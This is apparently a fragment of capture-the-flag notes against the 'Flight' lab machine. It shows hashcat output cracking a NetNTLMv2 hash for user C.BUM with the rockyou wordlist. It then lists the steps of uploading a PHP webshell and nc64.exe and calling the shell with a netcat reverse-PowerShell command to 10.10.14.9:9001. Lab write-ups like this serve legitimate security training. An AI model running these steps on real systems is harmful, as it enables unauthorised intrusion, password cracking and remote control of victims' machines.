Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: C.BUM::flight.htb:aaaaaaaaaaaaaaaa:be7a5f67096d66bf...000000
Time.Started.....: Fri Nov 14 12:38:51 2025 (6 secs)
Time.Estimated...: Fri Nov 14 12:38:57 2025 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  1778.5 kH/s (1.86ms) @ Accel:1024 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10539008/14344385 (73.47%)
Rejected.........: 0/10539008 (0.00%)
Restore.Point....: 10534912/14344385 (73.44%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: Tioncurtis23 -> Thelittlemermaid

Started: Fri Nov 14 12:38:50 2025
Stopped: Fri Nov 14 12:38:59 2025

```
- uploading a standard webshell
- uploading nc64.exe https://eternallybored.org/misc/netcat/
- navigating to 'http://school.flight.htb/yourMomsShell.php?cmd=nc64.exe%20-e%20powershell.exe%2010.10.14.9%209001'
- 













